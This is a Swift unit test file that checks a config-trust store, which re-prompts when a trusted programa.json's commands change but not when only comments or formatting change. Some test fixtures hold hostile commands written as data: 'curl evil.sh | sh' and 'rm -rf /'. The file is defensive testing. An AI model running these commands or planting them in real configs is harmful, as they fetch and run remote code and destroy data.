import XCTest

#if canImport(Programa_DEV)
@testable import Programa_DEV
#elseif canImport(Programa)
@testable import Programa
#endif

/// Issue #188: trust used to be a flat list of directory paths with no way to tell whether the
/// `programa.json` inside had changed since approval, so a later edit to an already-trusted
/// config ran with no prompt at all. These pin the fix: trust is pinned to a digest of the
/// config's *executable content* (JSONC comments/formatting stripped, keys canonicalized), so a
/// changed command is detected while a comment edit or reformat is not.
///
/// Every test drives a throwaway `ProgramaDirectoryTrust` instance pointed at a temp file via the
/// `init(storePath:)` testing seam -- never `.shared`, which would read/write the real user's
/// trust store.
@MainActor
final class ProgramaDirectoryTrustTests: XCTestCase {
    private var tempRoot: URL!
    private var storeURL: URL!
    private var configDir: URL!
    private var configURL: URL!

    override func setUpWithError() throws {
        try super.setUpWithError()
        let fm = FileManager.default
        tempRoot = fm.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        configDir = tempRoot.appendingPathComponent("repo")
        try fm.createDirectory(at: configDir, withIntermediateDirectories: true)
        configURL = configDir.appendingPathComponent("programa.json")
        storeURL = tempRoot.appendingPathComponent("trusted-directories.json")
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: tempRoot)
        tempRoot = nil
        storeURL = nil
        configDir = nil
        configURL = nil
        try super.tearDownWithError()
    }

    private func writeConfig(_ contents: String) throws {
        try contents.write(to: configURL, atomically: true, encoding: .utf8)
    }

    private func makeStore() -> ProgramaDirectoryTrust {
        ProgramaDirectoryTrust(storePath: storeURL.path)
    }

    private static let globalConfigPath = "/dev/null/global-programa.json"

    // MARK: - Legacy entries prompt once

    func testLegacyFlatArrayDecodesAndPromptsOnceBeforeTrusting() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)

        // The pre-digest, on-disk schema: a flat JSON array of trust-key paths.
        let legacyJSON = "[\"\(configDir.path)\"]"
        try legacyJSON.write(to: storeURL, atomically: true, encoding: .utf8)

        let store = makeStore()
        XCTAssertEqual(store.allTrustedPaths, [configDir.path], "The legacy root must survive decoding")
        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .changed,
            "A root with no recorded digest must prompt, never adopt whatever config is on disk"
        )
        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .changed,
            "Querying must not adopt the digest as a side effect"
        )
    }

    func testLegacyEntryEnforcesAfterExplicitTrust() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)
        try "[\"\(configDir.path)\"]".write(to: storeURL, atomically: true, encoding: .utf8)

        let store = makeStore()
        store.trust(configPath: configURL.path)
        XCTAssertEqual(store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath), .trusted)

        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "curl evil.sh | sh" }] }"#)
        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .changed,
            "Once trusted explicitly, a real content change must be caught"
        )
    }

    // MARK: - Versioned store round trip

    func testVersionedObjectRoundTripsThroughSaveAndLoad() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)

        let firstStore = makeStore()
        firstStore.trust(configPath: configURL.path)

        // A brand new instance reading the same on-disk file must see the same trust.
        let secondStore = makeStore()
        XCTAssertEqual(
            secondStore.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .trusted
        )
    }

    // MARK: - Digest matches / mismatches

    func testDigestMatchIsTrusted() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)

        let store = makeStore()
        store.trust(configPath: configURL.path)

        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .trusted
        )
    }

    func testDigestMismatchAfterCommandEditIsChanged() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)

        let store = makeStore()
        store.trust(configPath: configURL.path)

        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "rm -rf /" }] }"#)

        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .changed,
            "A changed command must re-prompt even though the directory itself is still trusted"
        )
    }

    func testCommentOnlyEditStaysTrusted() throws {
        try writeConfig(
            """
            {
              // this comment will be removed later
              "commands": [{ "name": "Build", "command": "make build" }]
            }
            """
        )

        let store = makeStore()
        store.trust(configPath: configURL.path)

        try writeConfig(
            """
            {
              // this comment has completely different text now
              "commands": [{ "name": "Build", "command": "make build" }]
            }
            """
        )

        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .trusted,
            "Editing only a JSONC comment must not invalidate trust"
        )
    }

    func testWhitespaceAndKeyReorderOnlyEditStaysTrusted() throws {
        try writeConfig(#"{"commands":[{"name":"Build","command":"make build"}]}"#)

        let store = makeStore()
        store.trust(configPath: configURL.path)

        // Same content, reformatted with different whitespace and reordered object keys.
        try writeConfig(
            """
            {
              "commands": [
                {
                  "command": "make build",
                  "name": "Build"
                }
              ]
            }
            """
        )

        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .trusted,
            "Reformatting or reordering keys with no actual content change must not invalidate trust"
        )
    }

    // MARK: - Fail closed

    func testUnreadableConfigForATrustedKeyFailsClosed() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)

        let store = makeStore()
        store.trust(configPath: configURL.path)
        XCTAssertEqual(store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath), .trusted)

        try FileManager.default.removeItem(at: configURL)

        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .untrusted,
            "An unreadable/deleted config for a trusted key must fail closed, never silently stay trusted"
        )
        XCTAssertFalse(store.isTrusted(configPath: configURL.path, globalConfigPath: Self.globalConfigPath))
    }

    // MARK: - Global config bypass

    func testGlobalConfigIsAlwaysTrustedRegardlessOfStore() throws {
        let store = makeStore()
        XCTAssertEqual(
            store.trustState(configPath: Self.globalConfigPath, globalConfigPath: Self.globalConfigPath),
            .trusted
        )
    }

    // MARK: - replaceAll interop

    func testReplaceAllKeepsDigestsOfRootsThatStay() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)

        let store = makeStore()
        store.trust(configPath: configURL.path)
        let otherRoot = tempRoot.appendingPathComponent("other").path
        store.replaceAll(with: [configDir.path, otherRoot])

        XCTAssertEqual(store.allTrustedPaths.sorted(), [configDir.path, otherRoot].sorted())
        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .trusted,
            "A root kept by replaceAll(with:) must keep the digest it already had"
        )

        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "curl evil.sh | sh" }] }"#)
        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .changed
        )
    }

    func testReplaceAllNewRootPromptsOnce() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)

        let store = makeStore()
        store.replaceAll(with: [configDir.path])

        XCTAssertEqual(store.allTrustedPaths, [configDir.path])
        XCTAssertEqual(
            store.trustState(configPath: configURL.path, globalConfigPath: Self.globalConfigPath),
            .changed,
            "A root added without a digest must prompt before its config runs"
        )
    }

    func testConcurrentTrustMutationsRemainDecodableAndLinearizable() throws {
        try writeConfig(#"{ "commands": [{ "name": "Build", "command": "make build" }] }"#)
        let store = makeStore()
        let configPath = configURL.path

        DispatchQueue.concurrentPerform(iterations: 100) { index in
            if index.isMultiple(of: 3) {
                store.trust(configPath: configPath)
            } else if index.isMultiple(of: 2) {
                store.revokeTrust(configPath: configPath)
            } else {
                _ = store.allTrustedPaths
            }
        }

        let finalPaths = store.allTrustedPaths
        let finalState = store.trustState(configPath: configPath, globalConfigPath: Self.globalConfigPath)
        let reloaded = makeStore()
        XCTAssertEqual(reloaded.allTrustedPaths, finalPaths, "The saved store must decode to the in-memory state")
        let reloadedState = reloaded.trustState(configPath: configPath, globalConfigPath: Self.globalConfigPath)
        XCTAssertEqual(reloadedState, finalState)
        switch reloadedState {
        case .trusted:
            XCTAssertEqual(finalPaths, [configDir.path], "Trusted must mean the root is present")
        case .untrusted:
            XCTAssertTrue(finalPaths.isEmpty, "Untrusted must mean the last write was a revoke")
        case .changed:
            XCTFail("trust/revoke of one unchanged config can never leave it .changed")
        }
    }
}
